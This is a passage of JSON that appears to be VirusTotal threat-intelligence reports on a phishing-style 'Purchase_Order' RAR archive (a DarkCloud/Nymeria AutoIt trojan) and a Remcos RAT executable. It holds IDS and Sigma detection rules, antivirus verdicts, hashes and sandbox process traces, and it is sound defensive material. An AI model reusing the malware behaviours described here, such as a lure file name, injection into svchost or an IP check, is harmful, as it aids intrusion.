      ],
      "tags": [
        "rar",
        "calls-wmi",
        "detect-debug-environment",
        "long-sleeps",
        "attachment"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "Attempted Information Leak",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY IP Check Domain (showip in HTTP Host)",
          "rule_id": "1:2008987",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET POLICY IP Check Domain (showip in HTTP Host)\"; flow:established,to_server; http.method; content:\"GET\"; http.host; content:\"showip.\"; fast_pattern; pcre:\"/^[^\\r\\n]*showip\\.[a-z]+(?:\\x3a\\d{1,5})?\\r?$/Wm\"; classtype:attempted-recon; sid:2008987; rev:9; metadata:created_at 2010_07_30, confidence High, signature_severity Informational, updated_at 2022_12_09, reviewed_at 2024_05_01;)",
          "alert_context": [
            {
              "dest_ip": "162.55.60.2",
              "dest_port": 80,
              "hostname": "showip.net",
              "url": "http://showip.net/"
            }
          ]
        },
        {
          "rule_category": "Attempted Information Leak",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY IP Check Domain (showip in HTTP Host)",
          "rule_id": "1:2008987",
          "alert_context": [
            {
              "dest_ip": "162.55.60.2",
              "dest_port": 80,
              "hostname": "showip.net",
              "url": "http://showip.net/"
            }
          ]
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET HUNTING [ANY.RUN] DARKCLOUD Style External IP Check",
          "rule_id": "1:2047083",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET HUNTING [ANY.RUN] DARKCLOUD Style External IP Check\"; flow:established,to_server; http.start; content:\"GET|20 2f 20|HTTP|2f|1|2e|1|0d 0a|User|2d|Agent|3a 20|Project1|0d 0a|Host|3a 20|showip|2e|net|0d 0a 0d 0a|\"; bsize:58; fast_pattern; reference:url,community.emergingthreats.net/t/darkcloud/844; classtype:external-ip-check; sid:2047083; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_08_08, deployment Perimeter, deployment SSLDecrypt, malware_family DarkCloud, confidence High, signature_severity Informational, updated_at 2023_08_08;)",
          "rule_references": [
            "https://community.emergingthreats.net/t/darkcloud/844"
          ],
          "alert_context": [
            {
              "dest_ip": "162.55.60.2",
              "dest_port": 80,
              "hostname": "showip.net",
              "url": "http://showip.net/"
            }
          ]
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET HUNTING [ANY.RUN] DARKCLOUD Style External IP Check",
          "rule_id": "1:2047083",
          "alert_context": [
            {
              "dest_ip": "162.55.60.2",
              "dest_port": 80,
              "hostname": "showip.net",
              "url": "http://showip.net/"
            }
          ]
        }
      ],
      "times_submitted": 3,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "8.16",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.4.3.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "CTX": {
          "method": "blacklist",
          "engine_name": "CTX",
          "engine_version": "2024.8.29.1",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "rar.trojan.nymeria"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.10",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "3.1.0.150",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Injector.AutoIt"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5419",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.22.3.0",
          "engine_update": "20250804",
          "category": "malicious",
          "result": "Trojan.Win32.Save.a"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.252.56617",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan ( 00564f471 )"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.252.56617",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan ( 00564f471 )"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "undetected",
          "result": null
        },
        "huorong": {
          "method": "blacklist",
          "engine_name": "huorong",
          "engine_version": "5483d89:5483d89:ef9f014:ef9f014",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.1013",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Win32.AutoIt_Heur.L"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.22.0.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "31652",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "a variant of Win32/Injector.Autoit.HEE"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "TROJ_GEN.R06CC0DGU25"
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.3.4",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.170.26895",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2024.8.0.61147",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470 (B)"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.69.6040",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan.AutoIt.1704"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "24.550.0.1002",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "TROJ_GEN.R06CC0DGU25"
        },
        "McAfeeD": {
          "method": "blacklist",
          "engine_name": "McAfeeD",
          "engine_version": "1.2.0.10275",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "3.0.3.0",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Mal/DrodRar-AIC"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.4.16.0",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan-Spy.Autoit"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.9.0.8",
          "engine_update": "20250227",
          "category": "undetected",
          "result": null
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1754530234",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Detected"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.22",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.25070.4",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.222.174",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "37936",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2025.0.0.23",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.D1D2E [many]"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "6.18-106783209",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Mal/DrodRar-AIC"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "GD:27.41334AVA:64.29606",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "AIT:Trojan.Nymeria.7470"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.6.1.3",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "W32/AutoIt.QA.gen!Eldorado"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.28.0.10568",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Trojan/AU3.Loader.S3029"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20240328",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.3.2",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "suspected of Win32.PhishingPE.Heur"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2025-08-07.01",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.28",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Injector/Autoit!1.12EF0 (CLASSIC)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "TrellixENS": {
          "method": "blacklist",
          "engine_name": "TrellixENS",
          "engine_version": "6.0.6.653",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "25.1.1.1",
          "engine_update": "20250114",
          "category": "undetected",
          "result": null
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "Trojan.Malware.300983.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "7.0.30.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "alibabacloud": {
          "method": "blacklist",
          "engine_name": "alibabacloud",
          "engine_version": "2.2.0",
          "engine_update": "20250321",
          "category": "undetected",
          "result": null
        },
        "google_safebrowsing": {
          "method": "blacklist",
          "engine_name": "google_safebrowsing",
          "engine_version": "1.0",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": null,
          "engine_update": "20250806",
          "category": "timeout",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "250806-02",
          "engine_update": "20250806",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20250124",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20250416",
          "category": "type-unsupported",
          "result": null
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "engine_update": "20250807",
          "category": "type-unsupported",
          "result": null
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.219",
          "engine_update": "20250729",
          "category": "type-unsupported",
          "result": null
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.683",
          "engine_update": "20250804",
          "category": "type-unsupported",
          "result": null
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20250807",
          "category": "type-unsupported",
          "result": null
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "type-unsupported",
          "result": null
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.4.0",
          "engine_update": "20250721",
          "category": "type-unsupported",
          "result": null
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "3.0.0.0",
          "engine_update": "20250805",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20250807",
          "category": "type-unsupported",
          "result": null
        }
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "filecondis": {
        "raw_md5": "aae0ed89054a1507db23b62ce7c853b3",
        "dhash": "0000000000000000"
      },
      "type_tags": [
        "compressed",
        "rar"
      ],
      "first_submission_date": 1754539071,
      "meaningful_name": "Purchase_Order_070825.rar",
      "popular_threat_classification": {
        "popular_threat_category": [
          {
            "count": 20,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "nymeria"
          },
          {
            "count": 7,
            "value": "autoit"
          },
          {
            "count": 2,
            "value": "drodrar"
          }
        ],
        "suggested_threat_label": "trojan.nymeria/autoit"
      },
      "magic": "RAR archive data, v5",
      "type_extension": "rar",
      "sigma_analysis_results": [
        {
          "rule_level": "medium",
          "rule_id": "a0daa529834b3c5230b4524da005a6b6503e7cb061e298a8f74e0dc1fee0a008",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Uncommon Svchost Parent Process",
          "rule_description": "Detects an uncommon svchost parent process",
          "rule_author": "Florian Roth (Nextron Systems)",
          "match_context": [
            {
              "values": {
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Hashes": "MD5=B7C999040D80E5BF87886D70D992C51E,SHA256=5C3257B277F160109071E7E716040E67657341D8C42AA68D9AFAFE1630FCC53E,IMPHASH=31245021771B01BCA0BE49250BDAA032",
                "Description": "Host Process for Windows Services",
                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                "ParentCommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\" ",
                "CommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\" ",
                "EventID": "1",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            },
            {
              "values": {
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Hashes": "MD5=B7C999040D80E5BF87886D70D992C51E,SHA256=5C3257B277F160109071E7E716040E67657341D8C42AA68D9AFAFE1630FCC53E,IMPHASH=31245021771B01BCA0BE49250BDAA032",
                "Description": "Host Process for Windows Services",
                "EventID": "1",
                "ParentCommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\"",
                "CommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\"",
                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            },
            {
              "values": {
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Hashes": "SHA1=115878CFB730B1F2CB084CDC51FDD92E9B36F9A8,MD5=B96D1C078A724E31B6F98CDB999E47F6,SHA256=49FAB89D62923D68D5F9627C68110EF522A668730598C3B09CD74FBE8F3F3E62,IMPHASH=CD4B689577AA1EF0BEFC1F09C4682C67",
                "Description": "Host Process for Windows Services",
                "EventID": "1",
                "ParentCommandLine": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "CommandLine": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            }
          ]
        },
        {
          "rule_level": "low",
          "rule_id": "afd546ea5eff265c454f77f6e7641ade6e5a791d79de155fa27d377be1581535",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Windows Processes Suspicious Parent Directory",
          "rule_description": "Detect suspicious parent processes of well-known Windows processes",
          "rule_author": "vburov",
          "match_context": [
            {
              "values": {
                "Hashes": "MD5=B7C999040D80E5BF87886D70D992C51E,SHA256=5C3257B277F160109071E7E716040E67657341D8C42AA68D9AFAFE1630FCC53E,IMPHASH=31245021771B01BCA0BE49250BDAA032",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Host Process for Windows Services",
                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                "ParentCommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\" ",
                "CommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\" ",
                "EventID": "1",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            },
            {
              "values": {
                "Hashes": "MD5=B7C999040D80E5BF87886D70D992C51E,SHA256=5C3257B277F160109071E7E716040E67657341D8C42AA68D9AFAFE1630FCC53E,IMPHASH=31245021771B01BCA0BE49250BDAA032",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Host Process for Windows Services",
                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                "ParentCommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\"",
                "CommandLine": "\"C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe\"",
                "EventID": "1",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            },
            {
              "values": {
                "Hashes": "SHA1=115878CFB730B1F2CB084CDC51FDD92E9B36F9A8,MD5=B96D1C078A724E31B6F98CDB999E47F6,SHA256=49FAB89D62923D68D5F9627C68110EF522A668730598C3B09CD74FBE8F3F3E62,IMPHASH=CD4B689577AA1EF0BEFC1F09C4682C67",
                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
                "OriginalFileName": "svchost.exe",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Host Process for Windows Services",
                "EventID": "1",
                "ParentCommandLine": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "CommandLine": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
                "ParentImage": "C:\\Users\\Bruno\\AppData\\Local\\Temp\\qvjcbyfx.4w4\\Purchase_Order_070825.exe",
                "IntegrityLevel": "High",
                "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
                "Company": "Microsoft Corporation"
              }
            }
          ]
        }
      ],
      "last_modification_date": 1754560262,
      "last_submission_date": 1754555393,
      "last_analysis_date": 1754539071,
      "sha1": "d798b13936517fc653337c03130c3462ed448b18",
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "critical": 0,
          "high": 0,
          "medium": 1,
          "low": 1
        }
      },
      "size": 836631,
      "available_tools": [],
      "sha256": "9de1c31e8218363945e54e623a2c8ffbf3895bdbc3c7faed98690b794b149b9c",
      "magika": "RAR",
      "reputation": -11,
      "last_analysis_stats": {
        "malicious": 26,
        "suspicious": 0,
        "undetected": 39,
        "harmless": 0,
        "timeout": 1,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 11
      },
      "trid": [
        {
          "file_type": "RAR compressed archive (v5.0)",
          "probability": 61.5
        },
        {
          "file_type": "RAR compressed archive (gen)",
          "probability": 38.4
        }
      ],
      "ssdeep": "24576:zCYBb8YEom24+Vx7E22tjYCAa7iKDyyhej:sCDVx7WEgDyMej",
      "crowdsourced_ids_stats": {
        "high": 0,
        "medium": 4,
        "low": 0,
        "info": 0
      },
      "tlsh": "T1A20533D42E32EDCD2609FB726FCAB064F0C94AA326B64A346ECF78D96840D4F1D15C94",
      "type_description": "RAR",
      "unique_sources": 3,
      "gti_assessment": {
        "contributing_factors": {
          "gti_confidence_score": 90,
          "gavs_detections": 3,
          "normalised_categories": [
            "trojan"
          ]
        },
        "verdict": {
          "value": "VERDICT_MALICIOUS"
        },
        "threat_score": {
          "value": 30
        },
        "severity": {
          "value": "SEVERITY_LOW"
        },
        "description": "This indicator is malicious (low severity). It was detected by Google's spam and threat filtering engines."
      }
    },
    "context_attributes": {
      "notification_id": "23059155134",
      "origin": "subscriptions",
      "notification_date": 1754557040,
      "sources": [
        {
          "id": "8ea653118ac1e66203acc16ee5335bfbf9f6c33107f52d80e929f571a70d96b5",
          "type": "collection",
          "label": "DarkCloud Malware"
        }
      ],
      "tags": [],
      "hunting_info": null
    }
  },
  {
    "id": "e26ce9a4659cba91652454d176122204d8718fda7944fd48adf853323562efc3",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e26ce9a4659cba91652454d176122204d8718fda7944fd48adf853323562efc3"
    },
    "attributes": {
      "sandbox_verdicts": {
        "CAPE Sandbox": {
          "category": "malicious",
          "malware_classification": [
            "MALWARE"
          ],
          "sandbox_name": "CAPE Sandbox",
          "malware_names": [
            "Remcos"
          ]
        },
        "Zenbox": {
          "category": "malicious",
          "malware_classification": [
            "MALWARE",
            "TROJAN",
            "EVADER",
            "RAT"
          ],
          "sandbox_name": "Zenbox",
          "malware_names": [
            "Remcos"
          ],
          "confidence": 68
        }
      },
      "threat_severity": {
        "version": 5,
        "threat_severity_level": "SEVERITY_MEDIUM",
        "threat_severity_data": {
          "popular_threat_category": "trojan",
          "num_gav_detections": 3
        },
        "last_analysis_date": "1754556676",
        "level_description": "Severity MEDIUM because it was considered trojan."
      },
      "md5": "b9e7831e2f188c25a3a44a802a373234",
      "type_tag": "peexe",
      "downloadable": true,
      "names": [
        "/home/petik/ss/malware/2025-08-07_b9e7831e2f188c25a3a44a802a373234_amadey_black-basta_cobalt-strike_elex_luca-stealer_remcos"
      ],
      "exiftool": {
        "MIMEType": "application/octet-stream",
        "Subsystem": "Windows GUI",
        "MachineType": "Intel 386 or later, and compatibles",
        "TimeStamp": "2025:07:24 15:06:22+00:00",
        "FileType": "Win32 EXE",
        "PEType": "PE32",
        "CodeSize": "363008",
        "InitializedDataSize": "141824",
        "ImageFileCharacteristics": "Executable, 32-bit",
        "FileTypeExtension": "exe",
        "LinkerVersion": "14.16",
        "SubsystemVersion": "5.1",
        "EntryPoint": "0x36fcb",
        "OSVersion": "5.1",
        "ImageVersion": "0.0",
        "UninitializedDataSize": "0"
      },
      "tags": [
        "peexe",
        "detect-debug-environment"
      ],
      "times_submitted": 1,
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20250806",
          "category": "malicious",
          "result": "W32.AIDetectMalware"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "8.16",
          "engine_update": "20250807",
          "category": "undetected",
          "result": null
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.219",
          "engine_update": "20250729",
          "category": "malicious",
          "result": "Windows.Trojan.Remcos"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "Generic.Dacic.A9349469.A.68B6D384"
        },
        "CTX": {
          "method": "blacklist",
          "engine_name": "CTX",
          "engine_version": "2024.8.29.1",
          "engine_update": "20250807",
          "category": "malicious",
          "result": "exe.unknown.dacic"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20250806",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
